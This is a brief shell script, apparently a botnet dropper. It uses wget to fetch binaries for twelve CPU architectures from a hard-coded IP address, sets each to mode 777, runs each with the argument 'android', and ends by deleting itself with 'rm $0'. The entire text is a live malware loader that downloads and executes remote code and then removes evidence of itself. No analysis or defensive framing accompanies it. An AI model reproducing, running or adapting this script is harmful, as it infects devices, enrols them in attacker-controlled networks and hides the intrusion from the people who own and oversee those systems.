wget http://159.203.15.179/arm; chmod 777 arm; ./arm android
wget http://159.203.15.179/arm5; chmod 777 arm5; ./arm5 android
wget http://159.203.15.179/arm6; chmod 777 arm6; ./arm6 android
wget http://159.203.15.179/arm7; chmod 777 arm7; ./arm7 android
wget http://159.203.15.179/sh4; chmod 777 sh4; ./sh4 android
wget http://159.203.15.179/arc; chmod 777 arc; ./arc android
wget http://159.203.15.179/mips; chmod 777 mips; ./mips android
wget http://159.203.15.179/mipsel; chmod 777 mipsel; ./mipsel android
wget http://159.203.15.179/sparc; chmod 777 sparc; ./sparc android
wget http://159.203.15.179/x86_64; chmod 777 x86_64; ./x86_64 android
wget http://159.203.15.179/i686; chmod 777 i686; ./i686 android
wget http://159.203.15.179/i586; chmod 777 i586; ./i586 android

rm $0